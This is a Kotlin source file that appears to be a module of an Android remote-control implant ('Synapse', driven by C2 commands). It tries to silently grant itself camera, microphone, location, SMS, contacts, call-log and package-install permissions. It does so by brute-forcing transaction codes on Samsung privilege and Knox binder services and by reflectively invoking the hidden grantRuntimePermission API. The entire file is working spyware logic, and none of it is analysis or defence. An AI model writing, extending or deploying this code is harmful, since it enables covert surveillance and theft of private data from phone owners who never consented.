package org.synapse.core.modules

import android.content.Context
import android.content.pm.PackageManager
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.lang.reflect.Method

object SilentPermissionGrant {

    private const val TAG = "Synapse.SilentGrant"

    private val DEFAULT_TARGET_PERMISSIONS = listOf(
        "android.permission.CAMERA",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.REQUEST_INSTALL_PACKAGES",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.BODY_SENSORS",
        "android.permission.ACTIVITY_RECOGNITION",
        "android.permission.READ_CALENDAR",
        "android.permission.WRITE_CALENDAR"
    )

    suspend fun grant(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val requested: List<String> = cmd.params["permissions"]
            ?.split(",")?.map { it.trim() }?.filter { it.isNotEmpty() }
            ?: DEFAULT_TARGET_PERMISSIONS

        val before = checkPermissionStates(context, requested)

        // Try grant via multiple techniques
        tryGrantViaSemPrivilege(requested)
        tryGrantViaAppPolicy(context, requested)
        tryGrantViaEnterprisePolicy(requested)
        tryGrantViaPackageManager(context, requested)

        val after = checkPermissionStates(context, requested)

        val granted = requested.filter { after[it] == true }
        val failed = requested.filter { after[it] != true }
        val newlyGranted = granted.filter { before[it] != true }

        SynapseResponse.PermissionGrantResponse(
            target_permissions = requested,
            granted = granted,
            failed = failed,
            details = "before=${before.count { it.value }} after=${granted.size} new=${newlyGranted.size}"
        )
    }

    private fun checkPermissionStates(context: Context, permissions: List<String>): Map<String, Boolean> {
        return permissions.associateWith { perm ->
            try { context.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED } catch (_: Exception) { false }
        }
    }

    private fun getBinderService(name: String): IBinder? {
        return try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            getService.invoke(null, name) as? IBinder
        } catch (e: Exception) { null }
    }

    private fun tryBinderTransaction(binder: IBinder, descriptors: List<String>, txCodes: IntRange, writeArgs: (Parcel) -> Unit, tag: String): List<String> {
        val successes = mutableListOf<String>()
        val data = Parcel.obtain(); val reply = Parcel.obtain()
        try {
            for (desc in descriptors) {
                for (txCode in txCodes) {
                    try {
                        data.setDataPosition(0); reply.setDataPosition(0)
                        data.writeInterfaceToken(desc); writeArgs(data)
                        val token = Binder.clearCallingIdentity()
                        try {
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                                if (rc in listOf(0, 1, -1)) successes.add("${tag}_TX_${txCode}_rc_$rc")
                            }
                        } finally { Binder.restoreCallingIdentity(token) }
                    } catch (_: Exception) {}
                }
                if (successes.isNotEmpty()) break
            }
        } finally { data.recycle(); reply.recycle() }
        return successes
    }

    private fun tryGrantViaSemPrivilege(permissions: List<String>) {
        val binder = getBinderService("semprivilege") ?: return
        val descriptors = listOf("com.samsung.android.privilege.IPrivilegeManager", "com.samsung.android.semprivilege.IPrivilegeManager")
        for (perm in permissions) {
            tryBinderTransaction(binder, descriptors, 1..20, tag = "sempriv_$perm", writeArgs = { data ->
                data.writeString("org.synapse.core")
                data.writeString(perm)
                data.writeInt(android.os.Process.myUid())
            })
        }
    }

    private fun tryGrantViaAppPolicy(context: Context, permissions: List<String>) {
        val binder = getBinderService("application_policy") ?: return
        val descriptors = listOf("com.samsung.android.knox.application.IApplicationPolicy", "com.samsung.android.knox.IApplicationPolicy")
        val targetPkg = context.packageName
        for (perm in permissions) {
            tryBinderTransaction(binder, descriptors, 1..25, tag = "apppol_$perm", writeArgs = { data ->
                data.writeString(targetPkg)
                data.writeString(perm)
                data.writeInt(1)
            })
        }
    }

    private fun tryGrantViaEnterprisePolicy(permissions: List<String>) {
        val binder = getBinderService("enterprise_policy") ?: return
        val descriptors = listOf("com.samsung.android.knox.IEnterpriseDeviceManager", "com.samsung.android.knox.enterprise.IEnterpriseDeviceManager")
        for (perm in permissions) {
            tryBinderTransaction(binder, descriptors, 1..30, tag = "entpol_$perm", writeArgs = { data ->
                data.writeString("org.synapse.core")
                data.writeString(perm)
                data.writeInt(0)
                data.writeInt(android.os.Process.myUid())
            })
        }
    }

    private fun tryGrantViaPackageManager(context: Context, permissions: List<String>) {
        try {
            val pm = context.packageManager
            val pmClass = pm.javaClass
            var grantMethod: Method? = null
            try {
                val userHandleClass = Class.forName("android.os.UserHandle")
                grantMethod = pmClass.getDeclaredMethod("grantRuntimePermission", String::class.java, String::class.java, userHandleClass)
            } catch (_: Exception) {
                try {
                    grantMethod = pmClass.getDeclaredMethod("grantRuntimePermission", String::class.java, String::class.java, Int::class.javaPrimitiveType!!)
                } catch (_: Exception) {
                    try { grantMethod = pmClass.getDeclaredMethod("grantRuntimePermission", String::class.java, String::class.java) } catch (_: Exception) {}
                }
            }
            if (grantMethod == null) return
            grantMethod.isAccessible = true
            val targetPkg = context.packageName
            for (perm in permissions) {
                try {
                    val ident = Binder.clearCallingIdentity()
                    try {
                        when (grantMethod.parameterTypes.size) {
                            2 -> grantMethod.invoke(pm, targetPkg, perm)
                            3 -> grantMethod.invoke(pm, targetPkg, perm, android.os.Process.myUserHandle())
                        }
                    } finally { Binder.restoreCallingIdentity(ident) }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }
}
